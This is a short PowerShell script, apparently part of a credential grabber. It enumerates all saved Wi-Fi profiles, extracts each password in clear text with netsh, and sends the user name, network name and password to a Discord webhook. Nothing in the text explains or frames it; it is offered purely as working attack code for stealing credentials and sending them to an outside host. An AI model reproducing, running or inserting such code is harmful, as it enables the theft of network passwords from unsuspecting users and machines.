netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

    # Send raw data (Wi-Fi profile and password) to the Discord webhook
    $rawData = $env:username + " | " + $wlan + " | " + $passw.Matches.Value
    
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body (@{
        'content' = $rawData
    } | ConvertTo-Json)
}
